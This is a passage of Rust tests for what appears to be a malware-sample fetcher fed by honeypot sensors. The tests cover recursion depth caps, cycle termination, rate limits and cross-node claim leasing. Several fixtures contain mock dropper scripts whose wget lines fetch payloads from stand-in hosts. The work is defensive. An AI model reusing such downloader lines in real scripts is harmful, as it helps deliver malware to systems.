                    host: host.to_string(),
                    scheme: "http".into(),
                    port: Some(80),
                    source_ip: None,
                    parent_hash: None,
                    depth: 0,
                    status: FetchStatus::Pending,
                    reject_reason: None,
                    sha256: None,
                    bytes: None,
                    content_type: None,
                    pinned_ip: None,
                    attempts: 0,
                    next_attempt: None,
                },
            )
            .await
            .unwrap();
        }

        let spool_dir = TempDir::new().unwrap();
        let deps = test_deps(pool.clone(), &spool_dir, 10);
        let fetcher = MockFetcher::new().default_outcome(RawOutcome::Failed {
            status: FetchStatus::Timeout,
            reason: None,
        });

        let stats = run_cycle_with(&deps, 50, &fetcher).await;
        assert_eq!(stats.selected, 50);
        assert_eq!(stats.timeout, 10, "must fetch exactly per_host_hour urls");
        assert_eq!(stats.skipped_bucket, 40);

        let attempted: i64 = sqlx::query_scalar(
            "SELECT COUNT(*) FROM fetch_attempt WHERE host = $1 AND status != 'pending'",
        )
        .bind(host)
        .fetch_one(&pool)
        .await
        .unwrap();
        let still_pending: i64 = sqlx::query_scalar(
            "SELECT COUNT(*) FROM fetch_attempt WHERE host = $1 AND status = 'pending'",
        )
        .bind(host)
        .fetch_one(&pool)
        .await
        .unwrap();
        assert_eq!(attempted, 10);
        assert_eq!(still_pending, 40);
    }

    // (e) a fetched script body enqueues depth-1 synthetic rows; depth 3 is never enqueued.
    #[tokio::test]
    async fn recursion_enqueues_children_but_never_past_max_depth() {
        let pool = test_pool().await;
        let host = "fetch8e.example";
        let ip = "203.0.113.12";
        reset_all(&pool).await;

        // Depth 0 -> 1: a real event-sourced download whose body is a dropper script.
        let loader_url = format!("http://{host}/loader.sh");
        append_event(
            &pool,
            download_event(ip, "sensor-e", &loader_url, "2026-08-22T00:00:00Z"),
        )
        .await
        .unwrap();
        let payload_url = format!("http://{host}/payload.arm");
        let script = format!("#!/bin/sh\nwget {payload_url}\n");

        // Depth 2 -> would-be 3: a synthetic row already at max_depth, seeded directly the way
        // two prior recursive cycles would have produced it.
        let stage3_url = format!("http://{host}/stage3.sh");
        store::upsert_attempt(
            &pool,
            &store::AttemptResult {
                url_hash: store::url_hash(&stage3_url),
                url: stage3_url.clone(),
                host: host.to_string(),
                scheme: "http".into(),
                port: Some(80),
                source_ip: None,
                parent_hash: None,
                depth: 2,
                status: FetchStatus::Pending,
                reject_reason: None,
                sha256: None,
                bytes: None,
                content_type: None,
                pinned_ip: None,
                attempts: 0,
                next_attempt: None,
            },
        )
        .await
        .unwrap();
        let final_url = format!("http://{host}/final.arm");
        let stage3_script = format!("#!/bin/sh\nwget {final_url}\n");

        let spool_dir = TempDir::new().unwrap();
        let deps = test_deps(pool.clone(), &spool_dir, 100);
        let fetcher = MockFetcher::new()
            .on(
                &loader_url,
                RawOutcome::Captured {
                    bytes: script.into_bytes(),
                    content_type: None,
                    pinned_ip: None,
                },
            )
            .on(
                &stage3_url,
                RawOutcome::Captured {
                    bytes: stage3_script.into_bytes(),
                    content_type: None,
                    pinned_ip: None,
                },
            );

        run_cycle_with(&deps, 10, &fetcher).await;

        use sqlx::Row;
        let depth1 =
            sqlx::query("SELECT depth, parent_hash FROM fetch_attempt WHERE url_hash = $1")
                .bind(store::url_hash(&payload_url))
                .fetch_one(&pool)
                .await
                .unwrap();
        let depth1_depth: i32 = depth1.get("depth");
        let depth1_parent: Vec<u8> = depth1.get("parent_hash");
        assert_eq!(depth1_depth, 1);
        assert_eq!(depth1_parent, store::url_hash(&loader_url));

        let depth3_count: i64 =
            sqlx::query_scalar("SELECT COUNT(*) FROM fetch_attempt WHERE host = $1 AND depth = 3")
                .bind(host)
                .fetch_one(&pool)
                .await
                .unwrap();
        assert_eq!(depth3_count, 0, "depth 3 must never be enqueued");

        let stage3_status: String =
            sqlx::query_scalar("SELECT status FROM fetch_attempt WHERE url_hash = $1")
                .bind(store::url_hash(&stage3_url))
                .fetch_one(&pool)
                .await
                .unwrap();
        assert_eq!(
            stage3_status, "success",
            "the depth-2 row itself still succeeds; only its children are capped"
        );
    }

    // Fix round 1, #1 (critical): a recursion child whose url_hash already has a row must never
    // reset that row - regardless of its current status. A -> B -> A must settle after both
    // succeed once, not ping-pong forever (the depth cap alone cannot stop a cycle if
    // re-discovering an already-`success` url resets it back to `pending`/depth 0).
    #[tokio::test]
    async fn recursion_cycle_a_to_b_to_a_terminates_without_perpetual_repending() {
        let pool = test_pool().await;
        let host = "fetch8i.example";
        reset_all(&pool).await;

        let url_a = format!("http://{host}/a.sh");
        let url_b = format!("http://{host}/b.sh");

        store::upsert_attempt(
            &pool,
            &store::AttemptResult {
                url_hash: store::url_hash(&url_a),
                url: url_a.clone(),
                host: host.to_string(),
                scheme: "http".into(),
                port: Some(80),
                source_ip: None,
                parent_hash: None,
                depth: 0,
                status: FetchStatus::Pending,
                reject_reason: None,
                sha256: None,
                bytes: None,
                content_type: None,
                pinned_ip: None,
                attempts: 0,
                next_attempt: None,
            },
        )
        .await
        .unwrap();

        let spool_dir = TempDir::new().unwrap();
        let deps = test_deps(pool.clone(), &spool_dir, 100);
        let script_a = format!("#!/bin/sh\nwget {url_b}\n").into_bytes();
        let script_b = format!("#!/bin/sh\nwget {url_a}\n").into_bytes();
        let fetcher = MockFetcher::new()
            .on(
                &url_a,
                RawOutcome::Captured {
                    bytes: script_a,
                    content_type: None,
                    pinned_ip: None,
                },
            )
            .on(
                &url_b,
                RawOutcome::Captured {
                    bytes: script_b,
                    content_type: None,
                    pinned_ip: None,
                },
            );

        // Cycle 1: selects A, captures it, enqueues B fresh at depth 1.
        let s1 = run_cycle_with(&deps, 10, &fetcher).await;
        assert_eq!(s1.succeeded, 1);
        assert_eq!(s1.enqueued_children, 1);

        // Cycle 2: selects B, captures it, and its script re-references A - which already has a
        // row (now `success`). That must be a no-op, not a reset back to `pending`.
        let s2 = run_cycle_with(&deps, 10, &fetcher).await;
        assert_eq!(s2.succeeded, 1);
        assert_eq!(
            s2.enqueued_children, 0,
            "re-discovering A must not create a new row or reset the existing one"
        );

        use sqlx::Row;
        let a_row = sqlx::query("SELECT status, depth FROM fetch_attempt WHERE url_hash = $1")
            .bind(store::url_hash(&url_a))
            .fetch_one(&pool)
            .await
            .unwrap();
        let a_status: String = a_row.get("status");
        let a_depth: i32 = a_row.get("depth");
        assert_eq!(
            a_status, "success",
            "A must stay success, not reset to pending"
        );
        assert_eq!(
            a_depth, 0,
            "A's depth must never be rewritten by being re-discovered"
        );

        // Cycle 3: both A and B are `success` - nothing eligible. If the bug were still present,
        // A would have been reset to `pending` in cycle 2 and would be selected again here,
        // ping-ponging forever.
        let s3 = run_cycle_with(&deps, 10, &fetcher).await;
        assert_eq!(
            s3.selected, 0,
            "the cycle must have terminated, nothing left to select"
        );

        let rows: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM fetch_attempt WHERE host = $1")
            .bind(host)
            .fetch_one(&pool)
            .await
            .unwrap();
        assert_eq!(rows, 2, "must never grow past the two real urls");
    }

    // Fix round 1, #1 (critical): a script that lists an already-`dead` url as a child must not
    // resurrect it - defeats the terminal-after-3-attempts guarantee otherwise.
    #[tokio::test]
    async fn recursion_never_resurrects_an_already_dead_child() {
        let pool = test_pool().await;
        let host = "fetch8j.example";
        reset_all(&pool).await;

        let dead_url = format!("http://{host}/dead.bin");
        let loader_url = format!("http://{host}/loader.sh");

        store::upsert_attempt(
            &pool,
            &store::AttemptResult {
                url_hash: store::url_hash(&dead_url),
                url: dead_url.clone(),
                host: host.to_string(),
                scheme: "http".into(),
                port: Some(80),
                source_ip: None,
                parent_hash: None,
                depth: 0,
                status: FetchStatus::Dead,
                reject_reason: Some("boom".into()),
                sha256: None,
                bytes: None,
                content_type: None,
                pinned_ip: None,
                attempts: 3,
                next_attempt: None,
            },
        )
        .await
        .unwrap();

        store::upsert_attempt(
            &pool,
            &store::AttemptResult {
                url_hash: store::url_hash(&loader_url),
                url: loader_url.clone(),
                host: host.to_string(),
                scheme: "http".into(),
                port: Some(80),
                source_ip: None,
                parent_hash: None,
                depth: 0,
                status: FetchStatus::Pending,
                reject_reason: None,
                sha256: None,
                bytes: None,
                content_type: None,
                pinned_ip: None,
                attempts: 0,
                next_attempt: None,
            },
        )
        .await
        .unwrap();

        let spool_dir = TempDir::new().unwrap();
        let deps = test_deps(pool.clone(), &spool_dir, 100);
        let script = format!("#!/bin/sh\nwget {dead_url}\n").into_bytes();
        let fetcher = MockFetcher::new().on(
            &loader_url,
            RawOutcome::Captured {
                bytes: script,
                content_type: None,
                pinned_ip: None,
            },
        );

        let stats = run_cycle_with(&deps, 10, &fetcher).await;
        assert_eq!(stats.succeeded, 1);
        assert_eq!(
            stats.enqueued_children, 0,
            "the already-dead url must not be re-enqueued"
        );

        use sqlx::Row;
        let row = sqlx::query(
            "SELECT status, attempts, reject_reason FROM fetch_attempt WHERE url_hash = $1",
        )
        .bind(store::url_hash(&dead_url))
        .fetch_one(&pool)
        .await
        .unwrap();
        let status: String = row.get("status");
        let attempts: i32 = row.get("attempts");
        let reason: Option<String> = row.get("reject_reason");
        assert_eq!(status, "dead");
        assert_eq!(attempts, 3);
        assert_eq!(reason.as_deref(), Some("boom"));

        let next = claim_unleased(&pool, 100).await;
        assert!(
            !next.iter().any(|c| c.url == dead_url),
            "a dead row must never be reselected"
        );
    }

    // Fix round 1, #1 (critical): a script that lists an already-`success` url as a child must
    // not reset it back to pending - would wipe sha256/bytes/content_type/pinned_ip for a sample
    // already safely spooled.
    #[tokio::test]
    async fn recursion_never_resets_an_already_successful_child() {
        let pool = test_pool().await;
        let host = "fetch8k.example";
        reset_all(&pool).await;

        let done_url = format!("http://{host}/done.bin");
        let loader_url = format!("http://{host}/loader2.sh");
        let existing_sha = vec![0xABu8; 32];

        store::upsert_attempt(
            &pool,
            &store::AttemptResult {
                url_hash: store::url_hash(&done_url),
                url: done_url.clone(),
                host: host.to_string(),
                scheme: "http".into(),
                port: Some(80),
                source_ip: None,
                parent_hash: None,
                depth: 0,
                status: FetchStatus::Success,
                reject_reason: None,
                sha256: Some(existing_sha.clone()),
                bytes: Some(1234),
                content_type: Some("application/octet-stream".into()),
                pinned_ip: Some("93.184.216.34".into()),
                attempts: 0,
                next_attempt: None,
            },
        )
        .await
        .unwrap();

        store::upsert_attempt(
            &pool,
            &store::AttemptResult {
                url_hash: store::url_hash(&loader_url),
                url: loader_url.clone(),
                host: host.to_string(),
                scheme: "http".into(),
                port: Some(80),
                source_ip: None,
                parent_hash: None,
                depth: 0,
                status: FetchStatus::Pending,
                reject_reason: None,
                sha256: None,
                bytes: None,
                content_type: None,
                pinned_ip: None,
                attempts: 0,
                next_attempt: None,
            },
        )
        .await
        .unwrap();

        let spool_dir = TempDir::new().unwrap();
        let deps = test_deps(pool.clone(), &spool_dir, 100);
        let script = format!("#!/bin/sh\nwget {done_url}\n").into_bytes();
        let fetcher = MockFetcher::new().on(
            &loader_url,
            RawOutcome::Captured {
                bytes: script,
                content_type: None,
                pinned_ip: None,
            },
        );

        let stats = run_cycle_with(&deps, 10, &fetcher).await;
        assert_eq!(stats.succeeded, 1);
        assert_eq!(stats.enqueued_children, 0);

        use sqlx::Row;
        let row =
            sqlx::query("SELECT status, sha256, bytes FROM fetch_attempt WHERE url_hash = $1")
                .bind(store::url_hash(&done_url))
                .fetch_one(&pool)
                .await
                .unwrap();
        let status: String = row.get("status");
        let sha256: Vec<u8> = row.get("sha256");
        let bytes: i32 = row.get("bytes");
        assert_eq!(status, "success");
        assert_eq!(sha256, existing_sha);
        assert_eq!(bytes, 1234);
    }

    // (f) a zero-byte body -> status='empty', no spool write, not re-fetched.
    #[tokio::test]
    async fn empty_body_is_recorded_with_no_spool_write_and_backs_off() {
        let pool = test_pool().await;
        let host = "fetch8f.example";
        let ip = "203.0.113.13";
        let url = format!("http://{host}/empty.bin");
        reset_all(&pool).await;

        append_event(
            &pool,
            download_event(ip, "sensor-f", &url, "2026-08-22T00:00:00Z"),
        )
        .await
        .unwrap();

        let spool_dir = TempDir::new().unwrap();
        let deps = test_deps(pool.clone(), &spool_dir, 100);
        let fetcher = MockFetcher::new().on(
            &url,
            RawOutcome::Failed {
                status: FetchStatus::Empty,
                reason: None,
            },
        );

        let stats = run_cycle_with(&deps, 10, &fetcher).await;
        assert_eq!(stats.empty, 1);

        use sqlx::Row;
        let row =
            sqlx::query("SELECT status, sha256, attempts FROM fetch_attempt WHERE url_hash = $1")
                .bind(store::url_hash(&url))
                .fetch_one(&pool)
                .await
                .unwrap();
        let status: String = row.get("status");
        let sha256: Option<Vec<u8>> = row.get("sha256");
        let attempts: i32 = row.get("attempts");
        assert_eq!(status, "empty");
        assert!(sha256.is_none());
        assert_eq!(attempts, 1);

        let entries: Vec<_> = std::fs::read_dir(spool_dir.path()).unwrap().collect();
        assert!(
            entries.is_empty(),
            "an empty body must never reach the spool"
        );

        // Not re-fetched immediately: next_attempt is still in the future.
        run_cycle_with(&deps, 10, &fetcher).await;
        let attempts_again: i32 =
            sqlx::query_scalar("SELECT attempts FROM fetch_attempt WHERE url_hash = $1")
                .bind(store::url_hash(&url))
                .fetch_one(&pool)
                .await
                .unwrap();
        assert_eq!(
            attempts_again, 1,
            "must not be re-fetched before next_attempt elapses"
        );
    }

    // Bonus: one URL's fetcher panic never aborts the batch (never-panic-the-caller requirement).
    #[tokio::test]
    async fn a_panicking_fetch_is_isolated_and_the_batch_continues() {
        let pool = test_pool().await;
        let host = "fetch8g.example";
        reset_all(&pool).await;

        let boom_url = format!("http://{host}/boom");
        let ok_url = format!("http://{host}/ok");
        for u in [&boom_url, &ok_url] {
            store::upsert_attempt(
                &pool,
                &store::AttemptResult {
                    url_hash: store::url_hash(u),
                    url: u.clone(),
                    host: host.to_string(),
                    scheme: "http".into(),
                    port: Some(80),
                    source_ip: None,
                    parent_hash: None,
                    depth: 0,
                    status: FetchStatus::Pending,
                    reject_reason: None,
                    sha256: None,
                    bytes: None,
                    content_type: None,
                    pinned_ip: None,
                    attempts: 0,
                    next_attempt: None,
                },
            )
            .await
            .unwrap();
        }

        let spool_dir = TempDir::new().unwrap();
        let deps = test_deps(pool.clone(), &spool_dir, 100);
        let fetcher = MockFetcher::new().panic_on_url(&boom_url).on(
            &ok_url,
            RawOutcome::Failed {
                status: FetchStatus::Timeout,
                reason: None,
            },
        );

        let stats = run_cycle_with(&deps, 10, &fetcher).await;
        assert!(stats.errors >= 1);
        assert_eq!(
            stats.timeout, 1,
            "the other url in the batch must still be processed"
        );

        let ok_attempts: i32 =
            sqlx::query_scalar("SELECT attempts FROM fetch_attempt WHERE url_hash = $1")
                .bind(store::url_hash(&ok_url))
                .fetch_one(&pool)
                .await
                .unwrap();
        assert_eq!(ok_attempts, 1);
    }

    // Fix round 1, #2 (important): spec section 9 - selection is newest-first. Payload URLs die
    // within minutes, so a stale-first order starves live captures behind a backlog of urls that
    // are probably already gone.
    #[tokio::test]
    async fn select_candidates_orders_newest_first_under_a_backlog() {
        let pool = test_pool().await;
        let host = "fetch8l.example";
        reset_all(&pool).await;

        let base = Utc::now();
        // Insert 5 rows with explicit, staggered first_seen timestamps directly via SQL (the
        // store DAL always defaults first_seen to now() at insert time, so backdating needs a
        // raw insert here rather than going through insert_pending_if_absent).
        for i in 0..5i64 {
            let url = format!("http://{host}/u{i}");
            let first_seen = base - chrono::Duration::minutes(5 - i);
            sqlx::query(
                "INSERT INTO fetch_attempt \
                 (url_hash, url, host, scheme, port, depth, status, attempts, first_seen, last_attempt) \
                 VALUES ($1, $2, $3, 'http', 80, 0, 'pending', 0, $4, $4)",
            )
            .bind(store::url_hash(&url))
            .bind(&url)
            .bind(host)
            .bind(first_seen)
            .execute(&pool)
            .await
            .unwrap();
        }

        let candidates = claim_unleased(&pool, 3).await;
        let urls: Vec<String> = candidates.into_iter().map(|c| c.url).collect();
        assert_eq!(
            urls,
            vec![
                format!("http://{host}/u4"),
                format!("http://{host}/u3"),
                format!("http://{host}/u2"),
            ],
            "must select the 3 newest rows, newest first - not the oldest"
        );
    }

    fn to_hex(bytes: &[u8]) -> String {
        bytes.iter().map(|b| format!("{b:02x}")).collect()
    }

    // --- cross-node coordination (audit P-02) ---
    //
    // Each "node" below is its own `PgPool`, so the two sides share nothing but the database -
    // the same position two review processes on two hosts are in.

    async fn seed_pending(pool: &PgPool, host: &str, n: usize) -> Vec<String> {
        let mut urls = Vec::new();
        for i in 0..n {
            let url = format!("http://{host}/n{i}");
            let (scheme, parsed_host, port) = store::parse_url_parts(&url).unwrap();
            store::insert_pending_if_absent(
                pool,
                &store::NewPendingRow {
                    url_hash: store::url_hash(&url),
                    url: url.clone(),
                    host: parsed_host,
                    scheme,
                    port,
                    source_ip: None,
                    parent_hash: None,
                    depth: 0,
                },
            )
            .await
            .unwrap();
            urls.push(url);
        }
        urls
    }

    fn leased(batch: i64, per_host_hour: i64, daily_cap: i64) -> store::ClaimLimits {
        store::ClaimLimits {
            batch,
            per_host_hour,
            daily_cap,
            lease: std::time::Duration::from_secs(600),
        }
    }

    #[tokio::test]
    async fn two_nodes_racing_one_backlog_claim_disjoint_rows() {
        let node_a = test_pool().await;
        let node_b = test_pool().await;
        reset_all(&node_a).await;
        let mut seeded = seed_pending(&node_a, "fetch8p.example", 10).await;
        seeded.extend(seed_pending(&node_a, "fetch8q.example", 10).await);

        let (a, b) = tokio::join!(
            store::claim_candidates(&node_a, leased(12, 100, 1_000)),
            store::claim_candidates(&node_b, leased(12, 100, 1_000)),
        );
        let a: HashSet<String> = a.unwrap().candidates.into_iter().map(|c| c.url).collect();
        let b: HashSet<String> = b.unwrap().candidates.into_iter().map(|c| c.url).collect();

        assert!(
            a.is_disjoint(&b),
            "a row claimed by one node must never be handed to the other: {:?}",
            a.intersection(&b).collect::<Vec<_>>()
        );
        let union: HashSet<String> = a.union(&b).cloned().collect();
        assert_eq!(union, seeded.into_iter().collect::<HashSet<_>>());
    }

    #[tokio::test]
    async fn the_per_host_hourly_cap_holds_across_nodes() {
        let node_a = test_pool().await;
        let node_b = test_pool().await;
        reset_all(&node_a).await;
        seed_pending(&node_a, "fetch8r.example", 10).await;

        let (a, b) = tokio::join!(
            store::claim_candidates(&node_a, leased(10, 4, 1_000)),
            store::claim_candidates(&node_b, leased(10, 4, 1_000)),
        );
        let (a, b) = (a.unwrap(), b.unwrap());
        assert_eq!(
            a.candidates.len() + b.candidates.len(),
            4,
            "two nodes must share one per-host budget, not get one each"
        );

        // The four in flight still count: a third claim while they are claimed gets nothing.
        let c = store::claim_candidates(&node_a, leased(10, 4, 1_000))
            .await
            .unwrap();
        assert!(c.candidates.is_empty());
        assert_eq!(c.skipped_bucket, 6);
    }

    #[tokio::test]
    async fn the_daily_cap_holds_across_nodes_and_charges_only_claimed_rows() {
        let node_a = test_pool().await;
        let node_b = test_pool().await;
        reset_all(&node_a).await;
        seed_pending(&node_a, "fetch8s.example", 3).await;
        seed_pending(&node_a, "fetch8t.example", 3).await;
        seed_pending(&node_a, "fetch8u.example", 3).await;

        let (a, b) = tokio::join!(
            store::claim_candidates(&node_a, leased(9, 100, 5)),
            store::claim_candidates(&node_b, leased(9, 100, 5)),
        );
        let (a, b) = (a.unwrap(), b.unwrap());
        assert_eq!(a.candidates.len() + b.candidates.len(), 5);
        // Whichever claims first takes 5 of 9 and skips 4; the other then sees only those same 4
        // unclaimed rows and skips all of them.
        assert_eq!(a.skipped_daily + b.skipped_daily, 8);

        let used: i32 = sqlx::query_scalar(
            "SELECT used FROM fetch_daily_usage WHERE day = (now() AT TIME ZONE 'UTC')::date",
        )
        .fetch_one(&node_a)
        .await
        .unwrap();
        assert_eq!(used, 5, "the daily cap is charged exactly what was claimed");
    }

    #[tokio::test]
    async fn an_idle_claim_costs_the_daily_budget_nothing() {
        let pool = test_pool().await;
        reset_all(&pool).await;
        for _ in 0..50 {
            let claim = store::claim_candidates(&pool, leased(20, 100, 10))
                .await
                .unwrap();
            assert!(claim.candidates.is_empty());
        }
        seed_pending(&pool, "fetch8v.example", 10).await;
        let claim = store::claim_candidates(&pool, leased(20, 100, 10))
            .await
            .unwrap();
        assert_eq!(
            claim.candidates.len(),
            10,
            "fifty idle claims must leave the whole daily budget"
        );
    }

    #[tokio::test]
    async fn the_daily_cap_resets_on_a_new_utc_day() {
        let pool = test_pool().await;
        reset_all(&pool).await;
        sqlx::query(
            "INSERT INTO fetch_daily_usage (day, used) \
             VALUES ((now() AT TIME ZONE 'UTC')::date - 1, 1000)",
        )
        .execute(&pool)
        .await
        .unwrap();
        seed_pending(&pool, "fetch8w.example", 3).await;

        let claim = store::claim_candidates(&pool, leased(3, 100, 5))
            .await
            .unwrap();
        assert_eq!(
            claim.candidates.len(),
            3,
            "yesterday's usage must not count today"
        );
    }

    #[tokio::test]
    async fn a_claim_hides_its_rows_until_recorded_or_the_lease_lapses() {
        let pool = test_pool().await;
        reset_all(&pool).await;
        let urls = seed_pending(&pool, "fetch8x.example", 1).await;

        let first = store::claim_candidates(&pool, leased(5, 100, 100))
            .await
            .unwrap();
        assert_eq!(first.candidates.len(), 1);
        let second = store::claim_candidates(&pool, leased(5, 100, 100))
            .await
            .unwrap();
        assert!(
            second.candidates.is_empty(),
            "a live claim must hide the row"
        );

        // A node that died mid-fetch never records an outcome; its lease lapsing returns the row.
        sqlx::query(
            "UPDATE fetch_attempt SET claim_expires = now() - interval '1 second' WHERE url = $1",
        )
        .bind(&urls[0])
        .execute(&pool)
        .await
        .unwrap();
        let third = store::claim_candidates(&pool, leased(5, 100, 100))
            .await
            .unwrap();
        assert_eq!(third.candidates.len(), 1);
    }

    /// Counts every URL it is asked to fetch, and always times out, so rows stay retryable.
    struct CountingFetcher {
        calls: Mutex<HashMap<String, usize>>,
    }

    impl Fetcher for CountingFetcher {
        async fn fetch(&self, _deps: &FetchDeps, candidate: &store::Candidate) -> RawOutcome {
            *self
                .calls
                .lock()
                .unwrap()
                .entry(candidate.url.clone())
                .or_default() += 1;
            tokio::time::sleep(std::time::Duration::from_millis(20)).await;
            RawOutcome::Failed {
                status: FetchStatus::Timeout,
                reason: None,
            }
        }
    }

    /// The side effect itself: two concurrent cycles on two nodes fetch each URL once, and the
    /// recorded outcome releases the claim.
    #[tokio::test]
    async fn concurrent_cycles_on_two_nodes_fetch_each_url_exactly_once() {
        let node_a = test_pool().await;
        let node_b = test_pool().await;
        reset_all(&node_a).await;
        seed_pending(&node_a, "fetch8y.example", 8).await;
        seed_pending(&node_a, "fetch8k.example", 8).await;

        let spool_a = TempDir::new().unwrap();
        let spool_b = TempDir::new().unwrap();
        let deps_a = test_deps(node_a.clone(), &spool_a, 100);
        let deps_b = test_deps(node_b.clone(), &spool_b, 100);
        let fetcher = CountingFetcher {
            calls: Mutex::new(HashMap::new()),
        };

        let (sa, sb) = tokio::join!(
            run_cycle_with(&deps_a, 16, &fetcher),
            run_cycle_with(&deps_b, 16, &fetcher),
        );
        assert_eq!(sa.timeout + sb.timeout, 16);

        let calls = fetcher.calls.into_inner().unwrap();
        assert_eq!(calls.len(), 16, "every seeded url fetched");
        assert!(
            calls.values().all(|&n| n == 1),
            "no url may be fetched by both nodes: {calls:?}"
        );

        let still_claimed: i64 = sqlx::query_scalar(
            "SELECT COUNT(*) FROM fetch_attempt \
             WHERE host IN ('fetch8y.example', 'fetch8k.example') AND claim_expires IS NOT NULL",
        )
        .fetch_one(&node_a)
        .await
        .unwrap();
        assert_eq!(still_claimed, 0, "a recorded outcome releases its claim");
    }

    #[test]
    fn the_claim_lease_covers_every_hop_of_every_wave_of_the_batch() {
        let limits = FetchLimits {
            max_bytes: 1,
            connect_timeout: std::time::Duration::from_secs(10),
            read_timeout: std::time::Duration::from_secs(30),
            total_timeout: std::time::Duration::from_secs(60),
            user_agent: String::new(),
            dns_timeout: std::time::Duration::from_secs(5),
        };
        // batch 20 at CONCURRENCY 8 is 3 waves; each candidate is up to 4 hops of (5 + 60) s
        // plus 30 s of local work.
        let lease = claim_lease(&limits, 3, 20);
        assert_eq!(
            lease,
            std::time::Duration::from_secs(3 * (4 * 65 + 30) + 60)
        );
        assert!(claim_lease(&limits, 3, 1) >= std::time::Duration::from_secs(4 * 65 + 30));
        assert!(claim_lease(&limits, 3, 0) > std::time::Duration::ZERO);
    }
}
